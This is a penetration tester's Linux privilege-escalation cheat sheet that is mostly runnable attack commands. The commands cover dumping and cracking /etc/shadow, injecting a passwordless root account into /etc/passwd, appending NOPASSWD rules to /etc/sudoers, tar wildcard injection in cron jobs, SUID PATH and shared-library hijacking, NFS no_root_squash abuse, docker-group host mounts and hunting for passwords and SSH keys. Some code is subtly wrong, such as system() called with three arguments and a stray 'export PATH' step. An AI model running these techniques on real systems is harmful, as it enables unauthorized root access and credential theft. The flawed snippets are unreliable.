---
description: >-
  It is not always possible to escalate privileges to root, we have to escalate
  privileges to another non-root user, then escalate privileges to root
---

# Privilege Escalation

### Checklist

Reference from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#checklists)

**Kernel and distribution release details**

**System Information:**

* [ ] &#x20;Hostname
* [ ] &#x20;Networking details:
* [ ] &#x20;Current IP
* [ ] &#x20;Default route details
* [ ] &#x20;DNS server information

**User Information:**

* [ ] &#x20;Current user details
* [ ] &#x20;Last logged on users
* [ ] &#x20;Shows users logged onto the host
* [ ] &#x20;List all users including uid/gid information
* [ ] &#x20;List root accounts
* [ ] &#x20;Extracts password policies and hash storage method information
* [ ] &#x20;Checks umask value
* [ ] &#x20;Checks if password hashes are stored in /etc/passwd
* [ ] &#x20;Extract full details for 'default' uid's such as 0, 1000, 1001 etc
* [ ] &#x20;Attempt to read restricted files i.e. /etc/shadow
* [ ] &#x20;List current users history files (i.e .bash\_history, .nano\_history, .mysql\_history , etc.)
* [ ] &#x20;Basic SSH checks

**Privileged access:**

* [ ] &#x20;Which users have recently used sudo
* [ ] &#x20;Determine if /etc/sudoers is accessible
* [ ] &#x20;Determine if the current user has Sudo access without a password
* [ ] &#x20;Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
* [ ] &#x20;Is root's home directory accessible
* [ ] &#x20;List permissions for /home/

**Environmental:**

* [ ] &#x20;Display current $PATH
* [ ] &#x20;Displays env information

**Jobs/Tasks:**

* [ ] &#x20;List all cron jobs
* [ ] &#x20;Locate all world-writable cron jobs
* [ ] &#x20;Locate cron jobs owned by other users of the system
* [ ] &#x20;List the active and inactive systemd timers

**Services:**

* [ ] &#x20;List network connections (TCP & UDP)
* [ ] &#x20;List running processes
* [ ] &#x20;Lookup and list process binaries and associated permissions
* [ ] &#x20;List inetd.conf/xined.conf contents and associated binary file permissions
* [ ] &#x20;List init.d binary permissions

**Version Information (of the following):**

* [ ] &#x20;Sudo
* [ ] &#x20;MYSQL
* [ ] &#x20;Postgres
* [ ] &#x20;Apache: Checks user config, Shows enabled modules, Checks for htpasswd files, View www directories

**Default/Weak Credentials:**

* [ ] &#x20;Checks for default/weak Postgres accounts
* [ ] &#x20;Checks for default/weak MYSQL accounts

**Searches:**

* [ ] &#x20;Locate all SUID/GUID files
* [ ] &#x20;Locate all world-writable SUID/GUID files
* [ ] &#x20;Locate all SUID/GUID files owned by root
* [ ] &#x20;Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
* [ ] &#x20;Locate files with POSIX capabilities
* [ ] &#x20;List all world-writable files
* [ ] &#x20;Find/list all accessible \*.plan files and display contents
* [ ] &#x20;Find/list all accessible \*.rhosts files and display contents
* [ ] &#x20;Show NFS server details
* [ ] &#x20;Locate \_.conf and \_.log files containing keyword supplied at script runtime
* [ ] &#x20;List all \*.conf files located in /etc
* [ ] &#x20;Locate mail

**Platform/software specific tests:**

* [ ] &#x20;Checks to determine if we're in a Docker container
* [ ] &#x20;Checks to see if the host has Docker installed
* [ ] &#x20;Checks to determine if we're in an LXC container

### Upgrade dumb shell

#### Spawn TTY shell

Use `rlwrap` to listening will enhance the shell, allowing to use arrow keys and clear the screen with `[Ctrl]+[L]`

```sh
rlwrap nc -nlvp 443
```

Or want to use su, nano and autocomplete (TAB), let's spawn a TTY shell from an interpreter:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```sh
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
```

```sh
ruby: exec "/bin/sh"
```

```sh
/usr/bin/script -qc /bin/bash /dev/null
```

#### Upgrading from nc with magic

To see more about your term, row, column information, use the following command on the attacker terminal:

```sh
echo $TERM && tput lines && tput cols
```

Then, run commands on victim reverse shell:

```sh
export SHELL=bash
export TERM=xterm-256color
```

Press `[Ctrl] + [z]`

```sh
stty raw -echo; fg
```

```sh
stty rows 41 columns 209
```

### Enumerate Basic information

Get current user context and hostname

```sh
id && hostname
```

### Running processes & Service Exploits

**Enumerate running process**

```sh
ps aux
ps aux | grep root
```

**Enumerate local ports**

```sh
netstat -ano
```

```sh
ss -anp
```

If the ports only allow internal access, use port forwarding techniques. Port forwarding from victim machine (SSH server listen on attacker):

```sh
ssh -f -N -R 3306:127.0.0.1:3306 kali@192.168.49.10
```

Port forwarding from attacker machine (SSH server listen on victim):

```sh
ssh -f -N -L 3306:127.0.0.1:3306 user@192.168.10.10
```

### Weak File Permissions

List world writable files on the system.

{% code overflow="wrap" %}
```sh
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```
{% endcode %}

#### /etc/shadow

!!! info The /etc/shadow file contains user password hashes

Get /etc/shadow permissions

```sh
ls -l /etc/shadow
```

**Readable /etc/shadow**

```sh
cat /etc/shadow
```

Save the root user (or someone you want to privilege escalate to) to a file and use `john` to crack it

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Finally, switch user with cracked password

```sh
su root
```

**Writable /etc/shadow**

Generate a new password:

```sh
mkpasswd -m sha-512 newpassword
```

Edit the /etc/shadow file and replace the root password hash. Finally, switch user with new password. Here is the empty password hash

{% code overflow="wrap" %}
```sh
root:$6$1.kHoCdgGLxINgw$TQbdEgrYcctS4/o7EKtmWaxwBoOHaeU2nK4B66Any.4ksSyb5FFedubBtSs.Rc9DkxD02ju7RfK/I0U8MXdb50:17298:0:99999:7:::
```
{% endcode %}

#### Writable /etc/passwd

!!! info The /etc/passwd file contains information about user accounts. It usually only readable.

Get /etc/passwd permissions

```sh
ls -l /etc/passwd
```

Generate a new password

```sh
openssl passwd newpassword
```

Then, copy the root user row, replace username with and the "x" field with the new password to create new root user. Here is a new user with username is `lithonn` and password is empty (empty not "empty")

```sh
lithonn:lF/bBdY9ikuzY:0:0:root:/root:/bin/bash
```

#### Writable /etc/sudoers

```sh
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

### Sudo

!!! info The `sudo` command allows user to run a program with root privileges. In some cases you may have permission to run some commands with sudo privileges without a password.

```sh
sudo -l
```

!!! warning Use the same command as in the output of the `sudo -l` command, without shortening.

### Cron Jobs

!!! info Cron jobs are programs/scripts run at specific times or interval.

```sh
ls -lah /etc/cron*
```

```sh
cat /etc/crontab
```

```sh
crontab -l
```

**Cron job watching**

Some cron process of root can not to find by listing, Use [pspy](https://github.com/DominicBreuker/pspy) to monitor process

```sh
./pspy64 -pf -i 1000
```

Then, try to modify or injection the cron job script.

#### File permissions

The cron job script can be modify by non owner user. Depending on the situation, we can replace the script with:

* Our reverse shell
* Set SUID for /bin/bash (or other program)
* Change/Create root user
* ...

#### PATH Environment Variable

Look for PATH variable in `/etc/crontab`

```sh
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

...
```

Then, check the permission on `/home/user`, if have write permssion, replace the cron job execute script.

#### Wildcards injection

Backup scripts often use `tar` to create compress files. If using tar with wildcard (\*), wildcard injection technique can be used to exploit.

Create 2 files with names: `--checkpoint=1` and `--checkpoint-action=exec=shell.elf`

```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Wait for cron job to compress files. The tar command will interpret files `--checkpoint=1` and `--checkpoint-action=exec=shell.elf` as 2 options instead of file names.

See more exploits at [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

> _**NOTE:**_ Can use this exploit with SUID

### SUID/SGID

The SUID/SGID allows files to be executed with the permission level of the file owner or the group owner.

Enumerate for SUID

```sh
find / -perm -u=s -type f 2>/dev/null
```

#### SUID Known Exploits

See how to exploit on [GTFOBins](https://gtfobins.github.io/) and [ExploitDB](https://www.exploit-db.com/)

#### SUID Environment variables

Use `strings` to look for relative path program. Example: call `service` instead of `/usr/bin/service`

```sh
strings /usr/bin/suidprogram
```

Then, create a fake program

```sh
echo "bash -p" > /tmp/service
```

Add /tmp to `$PATH`

```sh
export PATH=/tmp:$PATH
```

Finally, run the SUID

#### Dynamic Library Hijacking

Check SUID share library

```sh
ldd /usr/bin/suidprogram
```

Determine which share library configuration files available

```sh
ls -l /etc/ld.so.conf.d/
```

Build C++ privilege escalation code

```sh
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void say_hi(){
    setuid(0); setgid(0); system("/bin/sh",NULL,NULL);
}
```

```sh
export PATH
```

Recheck the the SUID

```sh
ldd /usr/bin/suidprogram
```

Finally, run the SUID.

### Password & SSH keys

#### Passwords

```sh
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

> _**NOTE:**_ Use "PASS" instead of "PASSWORD" for more result

#### SSH keys

```sh
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

### NFS

Read the /etc/exports file

```sh
cat /etc/exports
```

Look for the **no\_root\_squash** or **no\_all\_squash** flag. If the directory that is configured this flag, you can mounting and write to this directory as root. Example:

```sh
user@victim:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/share localhost(rw,sync,no_root_squash)
```

Mount the directory to kali (If only for localhost, use port forwarding technique)

```sh
mkdir /tmp/mounting
mount -t nfs <Victim IP>:<SHARED_FOLDER> /tmp/mounting
cp /bin/bash /tmp/mounting
chmod +s /tmp/mounting/bash
```

Then, run our file on victim:

```sh
cd <SHARED_FOLDER>
./bash -p
```

### Capabilities

!!! info Capabilities in Linux allow them specific privileges that are normally reserved for root-level actions (intercept network traffic, mount/unmount file systems, ...)

Listing capabilities of binaries

```sh
/usr/bin/getcap -r  /usr/bin
```

Interesting capabilities

* openssl=ep (Exploit: [https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099))

### Groups

#### Docker Group

Mount the `/` to container

```sh
docker pull alpine
docker run -v /:/mnt -it alpine /bin/sh
```

#### Disk Group

!!! info The disk group can manage disks.

Find where the root (`/`) mounted

```sh
df -h | grep "/$"
```

```sh
$ debugfs /dev/sda5
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /etc/shadow
```

#### Adm Group

!!! info Group adm have permissions to read log files located inside /var/log/

```sh
find / -group adm 2>/dev/null | grep -v 'proc' | xargs ls -l 2>/dev/null
```

### Kernel exploit

```sh
uname -a
```

```sh
cat /etc/issue
```

```sh
cat /etc/*-release
```
